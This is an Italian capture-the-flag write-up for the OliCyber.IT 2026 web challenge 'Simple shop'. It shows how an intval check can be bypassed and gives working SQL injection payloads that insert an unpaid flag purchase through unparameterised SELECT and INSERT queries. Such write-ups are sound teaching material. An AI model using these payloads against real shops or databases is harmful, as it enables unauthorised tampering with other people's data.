# OliCyber.IT 2026 - Selezione Territoriale

## [web] Simple shop (8 solves)

Questo negozio online ha un sacco di controlli che ci impediscono di comprare la flag...

Sito: [https://simple-shop.challs.olicyber.it/](https://simple-shop.challs.olicyber.it/)

Author: Lorenzo Leonardini <@pianka>

## Panoramica

Ancora una volta ci troviamo davanti a uno shop online, dove sono disponibili diversi prodotti da acquistare, tra cui la flag, per cui però non abbiamo abbastanza soldi.

## Soluzione

Il file `buy.php`, utilizzato per effettuare l'acquisto vero e proprio dei prodotti, non utilizza prepared statement per l'interazione con il database, e pertanto permette di effettuare SQL injection.

Nostro obiettivo finale è quello di inserire nella tabella `inventory` un `product_id` con valore 99, ovvero quello legato alla flag. Ci sono alcuni controlli che ci impediscono di acquistare direttamente la flag, in particolare:

- un check che verifica che l'utente abbia abbastanza soldi per effettuare l'acquisto
- un check che verifica che il valore di `intval($product_id)` sia nella list adi id legittimi `[1,2,3,4]`

La funzione `intval` di PHP però, nell'effettuare il parsing della stringa per convertirla a numero, si ferma al primo carattere non numerico, senza sollevare alcuna eccezione. Ciò significa che `intval("123asd") = 123`, e pertanto il secondo controllo si può bypassare semplicemente inviando un payload che inizi con `1`, `2`, `3`, o `4`.

A questo punto il nostro obiettivo è quello di iniettare del sql nella seguente query, affinché venga inserita anche una riga contenente `(username, 99)`:

```php
$pdo->query("INSERT INTO inventory (user, product_id) VALUES ('$username', $product_id);");
```

Il problema è che il valore di `$product_id` viene anche iniettato nella query precedente, da cui è necessario che ritorni un prodotto valido:

```php
$product = $pdo->query("SELECT * FROM products WHERE id='$product_id'")->fetch();
```

## Exploit

Poiché in una delle due query il valore viene inserito dentro degli apici come stringa, e nell'altra no, è possibile creare un payload che venga interpretato diversamente nelle due query. In particolare, inviando qualcosa come

```text
1) -- -' UNION SELECT 1, 'foo' 1 -- -
```

otterremo le seguenti due query, entrambe valide:

```sql
SELECT * FROM products WHERE id='1) -- -' UNION SELECT 1, 'foo' 1 -- -'
```

```sql
INSERT INTO inventory (user, product_id) VALUES ('username', 1) -- -' UNION SELECT 1, 'foo' 1 -- -);
```

Dato però che non possiamo inserire direttamente l'id `99` (ricordiamo che c'è un controllo che richiede che il payload inizi con `1`, `2`, `3`, o `4`), dobbiamo iniettare una seconda riga nella query INSERT:

```text
1), ('username', 99) -- -' UNION SELECT 1, 'foo' 1 -- -
```

notiamo però che con questo payload la prima query risulta rotta, in quanto stiamo utilizzando gli apici per delimitare la stringa dello username:

```sql
SELECT * FROM products WHERE id='1), ('username', 99) -- -' UNION SELECT 1, 'foo' 1 -- -'
```

Fortunatamente, SQLite ci permette di delimitare le stringhe anche con le virgolette:

```text
1), ("username", 99) -- -' UNION SELECT 1, 'foo' 1 -- -
```

risultando quindi nelle seguenti injection:

```sql
SELECT * FROM products WHERE id='1), ("username", 99) -- -' UNION SELECT 1, 'foo' 1 -- -'
```

```sql
INSERT INTO inventory (user, product_id) VALUES ('username', 1), ("username", 99) -- -' UNION SELECT 1, 'foo' 1 -- -);
```
